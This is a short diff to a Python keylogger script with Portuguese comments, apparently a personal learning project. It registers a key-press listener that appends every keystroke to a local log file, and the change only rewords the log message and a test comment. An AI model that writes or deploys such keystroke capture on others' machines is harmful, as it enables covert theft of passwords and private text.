@@ -25,7 +25,7 @@ def writeLog(key):
 
     # abrindo o arquivo para adicionar o que foi precionando. Usando o "append" para adicionar uma nova linha
     with open(logFile, "a") as f:
-        f.write(f'A teclada por: {keydata}\n')
+        f.write(f'A tecla clicada foi: {keydata}\n')
 
 # abrindo o LIstener para registrar as teclas quanto precionar
 # quando o evendo on_press ocorrer, chamar função WriteLog
@@ -34,4 +34,4 @@ with Listener(on_press=writeLog) as l:
 # usando o: tail -f /home/lucas/Projects/KeyLogger/logger.txt
 # você acompanha o arquivo
 
-# Teste aqui: 
+# Teste aqui: This is a test
